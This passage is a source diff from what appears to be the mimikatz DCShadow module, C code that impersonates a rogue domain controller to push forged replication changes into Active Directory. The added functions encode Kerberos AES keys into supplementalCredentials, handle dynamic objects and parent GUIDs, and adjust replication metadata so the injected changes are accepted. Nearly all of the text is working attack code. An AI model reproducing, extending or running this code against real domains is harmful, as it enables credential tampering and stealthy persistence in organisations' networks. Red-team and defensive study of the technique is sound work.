+				if(!dataToHexWithoutNull(property->PropertyName + argDwType, property->NameLength - (argDwType * sizeof(wchar_t)), pStrings, dwPackageString))
+					break;
+				pStrings += (property->NameLength - argDwType) * 2;
+				dwPackageString -= (property->NameLength - argDwType) * 2;
+				
+				if((i + 1) < (*properties)->PropertyCount)
+				{
+					if(!dataToHexWithoutNull(L"\0", 2, pStrings, dwPackageString))
+						break;
+					pStrings += 4;
+					dwPackageString -= 4;
+				}
+			}
+		}
+		va_end(vaList);
+		if(!(status = (i == (*properties)->PropertyCount)))
+			*properties = (PUSER_PROPERTIES) LocalFree(*properties);
+	}
+	return status;
+}
+
+// minimal for AES128 & AES256
+BOOL kuhl_m_lsadump_dcshadow_build_replication_value_supplementalCredentials_KerbStoredCredentialNew(LPCWSTR salt, LPCBYTE aes256, LPCBYTE aes128, DWORD iterations, PKERB_STORED_CREDENTIAL_NEW *creds, DWORD *dwSize)
+{
+	BOOL status = FALSE;
+	DWORD dwSalt;
+	PKERB_KEY_DATA_NEW pData;
+
+	if(aes256 || aes128)
+	{
+		dwSalt = lstrlen(salt) * sizeof(wchar_t);
+		*dwSize = sizeof(KERB_STORED_CREDENTIAL_NEW) + dwSalt;
+		if(aes256)
+			*dwSize += sizeof(KERB_KEY_DATA_NEW) + AES_256_KEY_LENGTH;
+		if(aes128)
+			*dwSize += sizeof(KERB_KEY_DATA_NEW) + AES_128_KEY_LENGTH;
+		if(*creds = (PKERB_STORED_CREDENTIAL_NEW) LocalAlloc(LPTR, *dwSize))
+		{
+			(*creds)->Revision = 4;
+			if(aes256)
+				(*creds)->CredentialCount++;
+			if(aes128)
+				(*creds)->CredentialCount++;
+			(*creds)->DefaultSaltLength = (*creds)->DefaultSaltMaximumLength = (USHORT) dwSalt;
+			(*creds)->DefaultSaltOffset = sizeof(KERB_STORED_CREDENTIAL_NEW) + (*creds)->CredentialCount * sizeof(KERB_KEY_DATA_NEW);
+			(*creds)->DefaultIterationCount = iterations;
+			RtlCopyMemory((PBYTE) *creds + (*creds)->DefaultSaltOffset, salt, (*creds)->DefaultSaltMaximumLength);
+			pData = (PKERB_KEY_DATA_NEW) ((PBYTE) (*creds) + sizeof(KERB_STORED_CREDENTIAL_NEW));
+			pData[0].IterationCount = iterations;
+			pData[0].KeyType = aes256 ? KERB_ETYPE_AES256_CTS_HMAC_SHA1_96 : KERB_ETYPE_AES128_CTS_HMAC_SHA1_96;
+			pData[0].KeyLength = aes256 ? AES_256_KEY_LENGTH : AES_128_KEY_LENGTH;
+			pData[0].KeyOffset = (*creds)->DefaultSaltOffset + (*creds)->DefaultSaltMaximumLength;
+			RtlCopyMemory((PBYTE) *creds + pData[0].KeyOffset, aes256 ? aes256 : aes128, pData[0].KeyLength);
+			if(aes128)
+			{
+				pData[1].IterationCount = iterations;
+				pData[1].KeyType = KERB_ETYPE_AES128_CTS_HMAC_SHA1_96;
+				pData[1].KeyLength = AES_128_KEY_LENGTH;
+				pData[1].KeyOffset = pData[0].KeyOffset + pData[0].KeyLength;
+				RtlCopyMemory((PBYTE) *creds + pData[1].KeyOffset, aes128, pData[1].KeyLength);
+			}
+			status = TRUE;
+		}
+	}
+	return status;
+}
+
+BOOL kuhl_m_lsadump_dcshadow_build_replication_value_supplementalCredentials_valueFromArgs(LPCWSTR theArg, DWORD count, PWSTR *salt, PBYTE *aes256, PBYTE *aes128)
+{
+	BOOL status = FALSE;
+	int ret;
+	wchar_t bSalt[64 + 1] = {0}, bAes256[64 + 1] = {0}, bAes128[64 + 1] = {0};
+	UNICODE_STRING uSalt, uAes256, uAes128;
+	DWORD size;
+
+	if(theArg)
+	{
+		*salt = NULL;
+		*aes256 = NULL;
+		*aes128 = NULL;
+
+		ret = swscanf_s(theArg, L"%[^:]:%[^:]:%s", bSalt, ARRAYSIZE(bSalt), bAes256, ARRAYSIZE(bAes256), bAes128, ARRAYSIZE(bAes128));
+		if(ret > 1)
+		{
+			RtlInitUnicodeString(&uSalt, bSalt);
+			kprintf(L"Salt  : %wZ\nAES256: ", &uSalt);
+			if(lstrlen(bAes256) != (AES_256_KEY_LENGTH * 2))
+			{
+				RtlInitUnicodeString(&uAes256, bAes256);
+				kprintf(L"(password - %wZ) ", &uAes256);
+				kuhl_m_kerberos_hash_data_raw(KERB_ETYPE_AES256_CTS_HMAC_SHA1_96, &uAes256, &uSalt, count, aes256, &size);
+			}
+			else
+			{
+				kprintf(L"(hex) ");
+				if(!kull_m_string_stringToHexBuffer(bAes256, aes256, &size))
+					PRINT_ERROR(L"kull_m_string_stringToHexBuffer(AES256)\n");
+			}
+			if(*aes256)
+			{
+				kull_m_string_wprintf_hex(*aes256, size, 0);
+				kprintf(L"\n");
+				if(status = kull_m_string_copy(salt, bSalt))
+				{
+					if(ret > 2)
+					{
+						kprintf(L"AES128: ");
+						if(lstrlen(bAes128) != (AES_128_KEY_LENGTH * 2))
+						{
+							RtlInitUnicodeString(&uAes128, bAes128);
+							kprintf(L"(password - %wZ) ", &uAes128);
+							kuhl_m_kerberos_hash_data_raw(KERB_ETYPE_AES128_CTS_HMAC_SHA1_96, &uAes128, &uSalt, count, aes128, &size);
+						}
+						else
+						{
+							kprintf(L"(hex) ");
+							if(!kull_m_string_stringToHexBuffer(bAes128, aes128, &size))
+								PRINT_ERROR(L"kull_m_string_stringToHexBuffer(AES128)\n");
+						}
+						if(*aes128)
+						{
+							kull_m_string_wprintf_hex(*aes128, size, 0);
+							kprintf(L"\n");
+						}
+					}
+				}
+				else
+				{
+					*aes256 = (PBYTE) LocalFree(*aes256);
+					PRINT_ERROR_AUTO(L"kull_m_string_copy");
+				}
+			}
+		}
+		else PRINT_ERROR(L"Error when parsing argument: %s (ret: %i)\n", theArg, ret);
+	}
+	else PRINT_ERROR(L"NULL arg\n");
+	return status;
+}
+
+BOOL kuhl_m_lsadump_dcshadow_build_replication_value_supplementalCredentials(ATTRVAL* pVal, PWSTR szValue)
+{
+	BOOL status = FALSE;
+	PWSTR salt;
+	PBYTE aes256, aes128;
+	PKERB_STORED_CREDENTIAL_NEW kerbCredentials;
+	DWORD dwKerbCredentials;
+	PUSER_PROPERTIES properties;
+	DWORD dwProperties;
+
+	kprintf(L"\n== Encoder helper for supplementalCredentials ==\n\n");
+	if(kuhl_m_lsadump_dcshadow_build_replication_value_supplementalCredentials_valueFromArgs(szValue, 4096, &salt, &aes256, &aes128))
+	{
+		if(kuhl_m_lsadump_dcshadow_build_replication_value_supplementalCredentials_KerbStoredCredentialNew(salt, aes256, aes128, 4096, &kerbCredentials, &dwKerbCredentials))
+		{
+			if(kuhl_m_lsadump_dcshadow_build_replication_value_supplementalCredentials_UserProperties(&properties, &dwProperties, 1, L"Primary:Kerberos-Newer-Keys", kerbCredentials, dwKerbCredentials))
+			{
+				kuhl_m_lsadump_dcsync_descrUserProperties(properties);
+				if(pVal->pVal = (PBYTE) MIDL_user_allocate(dwProperties))
+				{
+					pVal->valLen = dwProperties;
+					RtlCopyMemory(pVal->pVal, properties, pVal->valLen);
+					status = TRUE;
+				}
+				LocalFree(properties);
+			}
+			LocalFree(kerbCredentials);
+		}
+		if(salt)
+			LocalFree(salt);
+		if(aes256)
+			LocalFree(aes256);
+		if(aes128)
+			LocalFree(aes128);
+	}
+	return status;
 }
 
 BOOL kuhl_m_lsadump_dcshadow_build_replication_value(PDCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE attribute)
 {
 	DWORD i;
-	DCSHADOW_SYNTAX_ENCODER encoder;
-	
+	DCSHADOW_SYNTAX_ENCODER encoder = NULL;
+
 	attribute->AttrVal.pAVal = (ATTRVAL*) MIDL_user_allocate(sizeof(ATTRVAL) * attribute->AttrVal.valCount);
 	if(!attribute->AttrVal.pAVal)
 		return FALSE;
-
-	switch (attribute->pAttribute->dwSyntax)
+	
+	if(attribute->pAttribute->szAttributeName)
 	{
-	case SYNTAX_UNICODE_STRING:
-		encoder = kuhl_m_lsadump_dcshadow_build_replication_value_unicode_string;
-		break;
-	case SYNTAX_OCTET_STRING:
-		encoder = kuhl_m_lsadump_dcshadow_build_replication_value_octet_string;
-		break;
-	case SYNTAX_DN:
-		encoder = kuhl_m_lsadump_dcshadow_build_replication_value_dn;
-		break;
-	case SYNTAX_INTEGER:
-		encoder = kuhl_m_lsadump_dcshadow_build_replication_value_dword;
-		break;
-	case SYNTAX_LARGE_INTEGER:
-		encoder = kuhl_m_lsadump_dcshadow_build_replication_value_large_integer;
-		break;
-	case SYNTAX_SID:
-		encoder = kuhl_m_lsadump_dcshadow_build_replication_value_sid;
-		break;
-	case SYNTAX_NTSECURITYDESCRIPTOR:
-		encoder = kuhl_m_lsadump_dcshadow_build_replication_value_security_descriptor;
-		break;
-	case SYNTAX_GENERALIZED_TIME:
-		encoder = kuhl_m_lsadump_dcshadow_build_replication_value_date;
-		break;
-	case SYNTAX_OID:
-		encoder = kuhl_m_lsadump_dcshadow_build_replication_value_oid;
-		break;
-	default:
-		PRINT_ERROR(L"Syntax for attribute %s not implemented (0x%x)", attribute->pAttribute->szAttributeName, attribute->pAttribute->dwSyntax);
-		return FALSE;
+		if(!_wcsicmp(attribute->pAttribute->szAttributeName, L"supplementalCredentials"))
+			encoder = kuhl_m_lsadump_dcshadow_build_replication_value_supplementalCredentials;
+	}
+	
+	if(!encoder)
+	{
+		switch (attribute->pAttribute->dwSyntax)
+		{
+		case SYNTAX_UNICODE_STRING:
+			encoder = kuhl_m_lsadump_dcshadow_build_replication_value_unicode_string;
+			break;
+		case SYNTAX_OCTET_STRING:
+			encoder = kuhl_m_lsadump_dcshadow_build_replication_value_octet_string;
+			break;
+		case SYNTAX_DN:
+			encoder = kuhl_m_lsadump_dcshadow_build_replication_value_dn;
+			break;
+		case SYNTAX_INTEGER:
+			encoder = kuhl_m_lsadump_dcshadow_build_replication_value_dword;
+			break;
+		case SYNTAX_LARGE_INTEGER:
+			encoder = kuhl_m_lsadump_dcshadow_build_replication_value_large_integer;
+			break;
+		case SYNTAX_SID:
+			encoder = kuhl_m_lsadump_dcshadow_build_replication_value_sid;
+			break;
+		case SYNTAX_NTSECURITYDESCRIPTOR:
+			encoder = kuhl_m_lsadump_dcshadow_build_replication_value_security_descriptor;
+			break;
+		case SYNTAX_GENERALIZED_TIME:
+			encoder = kuhl_m_lsadump_dcshadow_build_replication_value_date;
+			break;
+		case SYNTAX_OID:
+			encoder = kuhl_m_lsadump_dcshadow_build_replication_value_oid;
+			break;
+		default:
+			PRINT_ERROR(L"Syntax for attribute %s not implemented (0x%x)", attribute->pAttribute->szAttributeName, attribute->pAttribute->dwSyntax);
+			return FALSE;
+		}
 	}
 	for(i = 0; i < attribute->AttrVal.valCount; i++)
 	{
@@ -1486,24 +1928,23 @@ BOOL kuhl_m_lsadump_dcshadow_build_replication_value(PDCSHADOW_PUSH_REQUEST_OBJE
 }
 
 // try to convert attributeschema into oid (reminder: strict input is oid value only)
-BOOL kuhl_m_lsadump_dcshadow_build_replication_get_schema_oid_values(PDCSHADOW_DOMAIN_INFO dif, PLDAP ld, PDCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE attr)
+BOOL kuhl_m_lsadump_dcshadow_build_replication_get_schema_oid_values(PDCSHADOW_DOMAIN_INFO info, PDCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE attr)
 {
 	BOOL fSuccess = FALSE;
-	DWORD i;
-	DWORD dwErr;
-	PWSTR szFilter, szTempValue;
-	PWSTR szAttributes[] = {L"governsID", NULL};
+	DWORD i, dwErr;
+	PWSTR szFilter, szTempValue, szAttributes[] = {L"governsID", NULL};
 	LDAPMessage *pSearchResult = NULL;
 	
 	for(i = 0; i< attr->AttrVal.valCount; i++)
 	{	
+		fSuccess = FALSE;
 		if(kull_m_string_sprintf(&szFilter, L"(&(objectClass=classSchema)(lDAPDisplayName=%s))", attr->pszValue[i]))
 		{
-			if(!(dwErr = ldap_search_s(ld, dif->szSchemaNamingContext, LDAP_SCOPE_ONELEVEL, szFilter, szAttributes, FALSE, &pSearchResult)))
+			if(!(dwErr = ldap_search_s(info->ld, info->szSchemaNamingContext, LDAP_SCOPE_ONELEVEL, szFilter, szAttributes, FALSE, &pSearchResult)))
 			{
-				if(ldap_count_entries(ld, pSearchResult) == 1)
+				if(ldap_count_entries(info->ld, pSearchResult) == 1)
 				{
-					szTempValue = kuhl_m_lsadump_dcshadow_getSingleTextAttr(ld, pSearchResult, szAttributes[0]);
+					szTempValue = kuhl_m_lsadump_dcshadow_getSingleTextAttr(info->ld, pSearchResult, szAttributes[0]);
 					if(szTempValue)
 					{
 						LocalFree(attr->pszValue[i]);
@@ -1511,55 +1952,70 @@ BOOL kuhl_m_lsadump_dcshadow_build_replication_get_schema_oid_values(PDCSHADOW_D
 						fSuccess = TRUE;
 					}
 				}
-				else PRINT_ERROR(L"attribute %s not found in AD\n", attr->pszValue[i]);
+				else PRINT_ERROR(L"objectClass %s not found in AD\n", attr->pszValue[i]);
 				ldap_msgfree(pSearchResult);
 			}
-			else PRINT_ERROR(L"attribute not found in AD 0x%x (%u)\n", dwErr, dwErr);
+			else PRINT_ERROR(L"objectClass not found in AD 0x%x (%u)\n", dwErr, dwErr);
 		}
+		if (!fSuccess)
+			break;
 	}
 	return fSuccess;
 }
 
-BOOL kuhl_m_lsadump_dcshadow_build_replication(PDCSHADOW_DOMAIN_INFO dif, PLDAP ld)
+BOOL kuhl_m_lsadump_dcshadow_build_replication(PDCSHADOW_DOMAIN_INFO info)
 {
 	DWORD i, j, k, dwAttributeId;;
 	
 	kprintf(L"** Attributes checking **\n\n");
-	for(i = 0; i < dif->request->cNumAttributes; i++)
+	for(i = 0; i < info->request->cNumAttributes; i++)
 	{
-		kprintf(L"#%u: %s\n", i, dif->request->pAttributes[i].szAttributeName);
-		if(!kuhl_m_lsadump_dcshadow_build_replication_attribute(ld, dif, dif->request->pAttributes + i))
+		kprintf(L"#%u: %s\n", i, info->request->pAttributes[i].szAttributeName);
+		if(!kuhl_m_lsadump_dcshadow_build_replication_attribute(info, info->request->pAttributes + i))
 		{
 			return FALSE;
 		}
 	}
 	kprintf(L"\n");
 	kprintf(L"** Objects **\n\n");
-	for(i = 0; i < dif->request->cNumObjects; i++)
+	for(i = 0; i < info->request->cNumObjects; i++)
 	{
-		kprintf(L"#%u: %s\n", i, dif->request->pObjects[i].szObjectDN);
-
-		if(!kuhl_m_lsadump_dcshadow_build_replication_version(ld, dif->szDomainNamingContext, dif->request->pObjects + i))
+		kprintf(L"#%u: %s\n", i, info->request->pObjects[i].szObjectDN);
+		
+		if(!kuhl_m_lsadump_dcshadow_build_replication_version(info->ld, info->szDomainNamingContext, info->request->pObjects + i))
 		{
 			return FALSE;
 		}
-		if(dif->request->pObjects[i].fAdd)
+
+		if(info->request->pObjects[i].dwFlag & OBJECT_TO_ADD)
 		{
 			kprintf(L"Object will be added\n");
 		}
-		for(j = 0; j < dif->request->pObjects[i].cbAttributes; j++)
+		if (info->request->pObjects[i].dwFlag & OBJECT_DYNAMIC)
+			kprintf(L"Dynamic object\n");
+		for(j = 0; j < info->request->pObjects[i].cbAttributes; j++)
 		{
 			BOOL fRemoveAtt = FALSE;
-			PDCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE attr = dif->request->pObjects[i].pAttributes + j;
+			PDCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE attr = info->request->pObjects[i].pAttributes + j;
 			// MS-DRSR : 4.1.1.2.10 PerformModifyEntInf
 			// The objectGUID and objectSid of the object being modified are returned in the info output structure.
 			if(_wcsicmp(attr->pAttribute->szAttributeName, L"ObjectGUID") == 0)
 			{
 				DWORD len = lstrlen(attr->pszValue[0]);
 				UNICODE_STRING GuidString = {(USHORT)len*sizeof(WCHAR),(USHORT)len*sizeof(WCHAR), attr->pszValue[0]};
-				if(NT_SUCCESS(RtlGUIDFromString(&GuidString, &dif->request->pObjects[i].ObjectGUID)))
+				if(NT_SUCCESS(RtlGUIDFromString(&GuidString, &info->request->pObjects[i].ObjectGUID)))
 				{
 					kprintf(L"  with GUID %s\n", attr->pszValue[0]);
+				}
+				fRemoveAtt = TRUE;
+			}
+			else if(_wcsicmp(attr->pAttribute->szAttributeName, L"parentGUID") == 0)
+			{
+				DWORD len = lstrlen(attr->pszValue[0]);
+				UNICODE_STRING GuidString = {(USHORT)len*sizeof(WCHAR),(USHORT)len*sizeof(WCHAR), attr->pszValue[0]};
+				if(NT_SUCCESS(RtlGUIDFromString(&GuidString, &info->request->pObjects[i].ParentGuid)))
+				{
+					kprintf(L"  with Parent GUID %s\n", attr->pszValue[0]);
 				}
 				fRemoveAtt = TRUE;
 			}
@@ -1569,23 +2025,23 @@ BOOL kuhl_m_lsadump_dcshadow_build_replication(PDCSHADOW_DOMAIN_INFO dif, PLDAP 
 				if(ConvertStringSidToSid(attr->pszValue[0], &pSid))
 				{
 					kprintf(L"  with SID %s\n", attr->pszValue[0]);
-					RtlCopyMemory(&dif->request->pObjects[i].pSid, pSid, 28);
+					RtlCopyMemory(&info->request->pObjects[i].pSid, pSid, 28);
 					LocalFree(pSid);
 				}
 				fRemoveAtt = TRUE;
 			}
 			if(fRemoveAtt)
 			{
-				RtlCopyMemory(attr, dif->request->pObjects[i].pAttributes + dif->request->pObjects[i].cbAttributes -1 , sizeof(DCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE));
+				RtlCopyMemory(attr, info->request->pObjects[i].pAttributes + info->request->pObjects[i].cbAttributes -1 , sizeof(DCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE));
 				j--;
-				dif->request->pObjects[i].cbAttributes--;
+				info->request->pObjects[i].cbAttributes--;
 				continue;
 			}
 
 			// encode class into OID if needed (string without a dot) - better for UI
 			if(attr->pAttribute->dwSyntax == SYNTAX_OID && attr->AttrVal.valCount > 0 && wcschr(attr->pszValue[0], '.') == NULL)
 			{
-				if(!kuhl_m_lsadump_dcshadow_build_replication_get_schema_oid_values(dif, ld, attr))
+				if(!kuhl_m_lsadump_dcshadow_build_replication_get_schema_oid_values(info, attr))
 					return FALSE;
 			}
 			if(!kuhl_m_lsadump_dcshadow_build_replication_value(attr))
@@ -1601,6 +2057,23 @@ BOOL kuhl_m_lsadump_dcshadow_build_replication(PDCSHADOW_DOMAIN_INFO dif, PLDAP 
 				kull_m_string_wprintf_hex(attr->AttrVal.pAVal[k].pVal, attr->AttrVal.pAVal[k].valLen, 0);
 				kprintf(L")\n");
 			}
+			if (attr->MetaData.dwFlag & REPLICATION_TIME_SET)
+			{
+				kprintf(L"    usnTimeChanged:");
+				kull_m_string_displayFileTime(&attr->MetaData.usnTimeChanged);
+				kprintf(L"\n");
+			}
+			if (attr->MetaData.dwFlag & REPLICATION_USN_SET)
+			{
+				kprintf(L"    usnOriginating:%u\n", attr->MetaData.usnOriginating);
+			}
+			if (attr->MetaData.dwFlag & REPLICATION_UID_SET)
+			{
+				kprintf(L"    uidOriginatingDsa:");
+				kull_m_string_displayGUID(&attr->MetaData.uidOriginatingDsa);
+				kprintf(L"\n");
+				
+			}
 			kprintf(L"\n");
 		}
 	}
@@ -1608,73 +2081,58 @@ BOOL kuhl_m_lsadump_dcshadow_build_replication(PDCSHADOW_DOMAIN_INFO dif, PLDAP 
 	return TRUE;
 }
 
-BOOL kuhl_m_lsadump_dcshadow_domain_and_replication_info(PDCSHADOW_DOMAIN_INFO dif)
+BOOL kuhl_m_lsadump_dcshadow_domain_and_replication_info(PDCSHADOW_DOMAIN_INFO info)
 {
-	PLDAP ld;
 	BOOL fSuccess = FALSE;
 	DWORD dwErr = 0;
-	BOOL fSupportsDeleteObject = FALSE;
-	ULONG version = LDAP_VERSION3;
 
-	if(ld = ldap_init((PWSTR) dif->szDCFQDN, 389))
+	kprintf(L"** Domain Info **\n\n");
+	fSuccess = kuhl_m_lsadump_dcshadow_domaininfo_rootDse(info)
+		&& (!info->fUseSchemaSignature || kuhl_m_lsadump_dcshadow_domaininfo_schemasignature(info));
+	if(fSuccess)
 	{
-		dwErr = ldap_set_option(ld, LDAP_OPT_PROTOCOL_VERSION, (void*)&version);
-		if(!(dwErr = ldap_connect(ld, NULL)))
-		{
-			// bind is done before checking the rootDse because STIG hardening does setup authentication for rootDse
-			if(!(dwErr = ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE)))
-			{
-				kprintf(L"** Domain Info **\n\n");
-				fSuccess = kuhl_m_lsadump_dcshadow_domaininfo_rootDse(ld, dif)
-					&& (!dif->fUseSchemaSignature || kuhl_m_lsadump_dcshadow_domaininfo_schemasignature(ld, dif));
-				if(fSuccess)
-				{
-					fSuccess = kuhl_m_lsadump_dcshadow_domaininfo_computer(dif, ld);
-				}
-				kprintf(L"\n");
-				if(fSuccess)
-				{
-					kprintf(L"** Server Info **\n\n");
-					if(fSuccess = kuhl_m_lsadump_dcshadow_objectGUID_invocationGUID(ld, dif, dif->szDCFQDN, &dif->realDc))
-					{
-						kprintf(L"Server: %s\n  InstanceId  : ", dif->szDCFQDN);
-						kull_m_string_displayGUID(&dif->realDc.InstanceId);
-						kprintf(L"\n  InvocationId: ");
-						kull_m_string_displayGUID(&dif->realDc.InvocationId);
-						kprintf(L"\n");
-					}
-					RtlZeroMemory(&dif->mimiDc, sizeof(DCSHADOW_DOMAIN_DC_INFO));
-					if(kuhl_m_lsadump_dcshadow_objectGUID_invocationGUID(ld, dif, dif->szFakeFQDN, &dif->mimiDc))
-					{
-						kprintf(L"Fake Server (already registered): %s\n  InstanceId  : ", dif->szFakeFQDN);
-						kull_m_string_displayGUID(&dif->mimiDc.InstanceId);
-						kprintf(L"\n  InvocationId: ");
-						kull_m_string_displayGUID(&dif->mimiDc.InvocationId);
-						kprintf(L"\n");
-					}
-					else kprintf(L"Fake Server (not already registered): %s\n", dif->szFakeFQDN);
-					kprintf(L"\n");
-				}
-				if(fSuccess && dif->request != NULL)
-					fSuccess = kuhl_m_lsadump_dcshadow_build_replication(dif, ld);
-			}
-			else PRINT_ERROR(L"ldap_bind_s 0x%x (%u)\n", dwErr, dwErr);
-		}
-		else
-		{
-			PRINT_ERROR(L"ldap_connect 0x%x (%u)\n", dwErr, dwErr);
-			ldap_unbind(ld);
-		}
+		fSuccess = kuhl_m_lsadump_dcshadow_domaininfo_computer(info);
 	}
-	else
+	kprintf(L"\n");
+	if(fSuccess)
 	{
-		dwErr = LdapGetLastError();
-		PRINT_ERROR(L"ldap_init 0x%x (%u)\n", dwErr, dwErr);
+		kprintf(L"** Server Info **\n\n");
+		if(fSuccess = kuhl_m_lsadump_dcshadow_objectGUID_invocationGUID(info, info->szDCFQDN, &info->realDc))
+		{
+			kprintf(L"Server: %s\n  InstanceId  : ", info->szDCFQDN);
+			kull_m_string_displayGUID(&info->realDc.InstanceId);
+			kprintf(L"\n  InvocationId: ");
+			kull_m_string_displayGUID(&info->realDc.InvocationId);
+			kprintf(L"\n");
+		}
+		RtlZeroMemory(&info->mimiDc, sizeof(DCSHADOW_DOMAIN_DC_INFO));
+		if(kuhl_m_lsadump_dcshadow_objectGUID_invocationGUID(info, info->szFakeFQDN, &info->mimiDc))
+		{
+			kprintf(L"Fake Server (already registered): %s\n  InstanceId  : ", info->szFakeFQDN);
+			kull_m_string_displayGUID(&info->mimiDc.InstanceId);
+			kprintf(L"\n  InvocationId: ");
+			kull_m_string_displayGUID(&info->mimiDc.InvocationId);
+			kprintf(L"\n");
+		}
+		else kprintf(L"Fake Server (not already registered): %s\n", info->szFakeFQDN);
+		kprintf(L"\n");
 	}
+	if(fSuccess && info->request != NULL)
+		fSuccess = kuhl_m_lsadump_dcshadow_build_replication(info);
 	return fSuccess;
 }
 
-BOOL kuhl_m_lsadump_dcshadow_object_to_replentinflist(PDCSHADOW_DOMAIN_INFO dif, REPLENTINFLIST ** ppReplEnt, PDCSHADOW_PUSH_REQUEST_OBJECT object, SCHEMA_PREFIX_TABLE *pPrefixTableSrc, PFILETIME pCurrentFt)
+static BOOL IsNullGuid(GUID* Guid)
+{
+	if (Guid->Data1 == 0 && Guid->Data2 == 0 && Guid->Data3 == 0 &&
+		((ULONG *)Guid->Data4)[0] == 0 && ((ULONG *)Guid->Data4)[1] == 0)
+	{
+		return TRUE;
+	}
+	return FALSE;
+}
+
+BOOL kuhl_m_lsadump_dcshadow_object_to_replentinflist(PDCSHADOW_DOMAIN_INFO info, REPLENTINFLIST ** ppReplEnt, PDCSHADOW_PUSH_REQUEST_OBJECT object, SCHEMA_PREFIX_TABLE *pPrefixTableSrc, PFILETIME pCurrentFt)
 {
 	DWORD i, len;
 	
@@ -1696,9 +2154,15 @@ BOOL kuhl_m_lsadump_dcshadow_object_to_replentinflist(PDCSHADOW_DOMAIN_INFO dif,
 			RtlCopyMemory(&(*ppReplEnt)->Entinf.pName->Guid, &object->ObjectGUID, sizeof(GUID));
 		}
 		(*ppReplEnt)->Entinf.ulFlags = ENTINF_FROM_MASTER;
+		if (OBJECT_DYNAMIC & object->dwFlag)
+			(*ppReplEnt)->Entinf.ulFlags |= ENTINF_DYNAMIC_OBJECT;
 		(*ppReplEnt)->Entinf.AttrBlock.attrCount =  object->cbAttributes;
-		(*ppReplEnt)->fIsNCPrefix = (_wcsicmp(dif->szDomainName, object->szObjectDN) == 0);
+		(*ppReplEnt)->fIsNCPrefix = (_wcsicmp(info->szDomainName, object->szObjectDN) == 0);
 		(*ppReplEnt)->pParentGuid = NULL;
+		if (!IsNullGuid(&object->ParentGuid) && ((*ppReplEnt)->pParentGuid = (GUID*) MIDL_user_allocate(sizeof(GUID))) != NULL)
+		{
+			RtlCopyMemory((*ppReplEnt)->pParentGuid, &object->ParentGuid, sizeof(GUID));
+		}
 		if((*ppReplEnt)->Entinf.AttrBlock.pAttr = (ATTR *) MIDL_user_allocate(sizeof(ATTR) * (*ppReplEnt)->Entinf.AttrBlock.attrCount))
 		{
 			for(i = 0; i < (*ppReplEnt)->Entinf.AttrBlock.attrCount; i++)
@@ -1716,19 +2180,22 @@ BOOL kuhl_m_lsadump_dcshadow_object_to_replentinflist(PDCSHADOW_DOMAIN_INFO dif,
 			(*ppReplEnt)->pMetaDataExt->cNumProps = (*ppReplEnt)->Entinf.AttrBlock.attrCount;
 			for(i = 0; i < (*ppReplEnt)->pMetaDataExt->cNumProps; i++)
 			{
-				(*ppReplEnt)->pMetaDataExt->rgMetaData[i].dwVersion = object->pAttributes[i].MetaData.curRevision + 1;
+				(*ppReplEnt)->pMetaDataExt->rgMetaData[i].dwVersion = object->pAttributes[i].MetaData.curRevision;
 				if(object->pAttributes[i].MetaData.dwFlag & REPLICATION_UID_SET)
 					RtlCopyMemory(&(*ppReplEnt)->pMetaDataExt->rgMetaData[i].uuidDsaOriginating, &object->pAttributes[i].MetaData.uidOriginatingDsa, sizeof(GUID));
 				else
-					RtlCopyMemory(&(*ppReplEnt)->pMetaDataExt->rgMetaData[i].uuidDsaOriginating, &dif->realDc.InstanceId, sizeof(GUID));
+					RtlCopyMemory(&(*ppReplEnt)->pMetaDataExt->rgMetaData[i].uuidDsaOriginating, &info->realDc.InstanceId, sizeof(GUID));
 				if(object->pAttributes[i].MetaData.dwFlag & REPLICATION_USN_SET)
 					(*ppReplEnt)->pMetaDataExt->rgMetaData[i].usnOriginating = object->pAttributes[i].MetaData.usnOriginating;
 				else
-					(*ppReplEnt)->pMetaDataExt->rgMetaData[i].usnOriginating = 42;
+					(*ppReplEnt)->pMetaDataExt->rgMetaData[i].usnOriginating = ++info->maxDCUsn;
 				if(object->pAttributes[i].MetaData.dwFlag & REPLICATION_TIME_SET)
 					(*ppReplEnt)->pMetaDataExt->rgMetaData[i].timeChanged = (*(PULONGLONG) &object->pAttributes[i].MetaData.usnTimeChanged) / 10000000;
 				else
 					(*ppReplEnt)->pMetaDataExt->rgMetaData[i].timeChanged = (*(PULONGLONG) pCurrentFt) / 10000000;
+				if (!(*ppReplEnt)->pMetaDataExt->rgMetaData[i].dwVersion || 
+					(*ppReplEnt)->pMetaDataExt->rgMetaData[i].timeChanged <= (DSTIME) (*(PULONGLONG) &object->pAttributes[i].MetaData.curTimeChanged) / 10000000)
+					(*ppReplEnt)->pMetaDataExt->rgMetaData[i].dwVersion++;
 			}
 		}
 		else return FALSE;
@@ -1786,7 +2253,7 @@ void kuhl_m_lsadump_dcshadow_encode_sensitive(REPLENTINFLIST *pReplEnt,  PDCSHAD
 	}
 }
 
-ULONG kuhl_m_lsadump_dcshadow_call_AddEntry(PDCSHADOW_DOMAIN_INFO dif, DRS_HANDLE hDrs, PDCSHADOW_PUSH_REQUEST_OBJECT pObject)
+ULONG kuhl_m_lsadump_dcshadow_call_AddEntry(PDCSHADOW_DOMAIN_INFO info, DRS_HANDLE hDrs, PDCSHADOW_PUSH_REQUEST_OBJECT pObject)
 {
 	NTSTATUS status = STATUS_UNSUCCESSFUL;
 	DRS_MSG_ADDENTRYREQ msgIn = {0};
@@ -1795,8 +2262,10 @@ ULONG kuhl_m_lsadump_dcshadow_call_AddEntry(PDCSHADOW_DOMAIN_INFO dif, DRS_HANDL
 	FILETIME ft = {0};
 	DRS_MSG_GETCHGREPLY_V6 reply = {0};
 	
-	if(kuhl_m_lsadump_dcshadow_object_to_replentinflist(dif, &reply.pObjects, pObject, (SCHEMA_PREFIX_TABLE*) &SCHEMA_DEFAULT_PREFIX_TABLE, &ft))
+	if(kuhl_m_lsadump_dcshadow_object_to_replentinflist(info, &reply.pObjects, pObject, (SCHEMA_PREFIX_TABLE*) &SCHEMA_DEFAULT_PREFIX_TABLE, &ft))
 	{
+		if (info->dwPushFlags & DOMAIN_INFO_PUSH_REMOTE_MODIFY)
+			reply.pObjects->Entinf.ulFlags |= ENTINF_REMOTE_MODIFY;
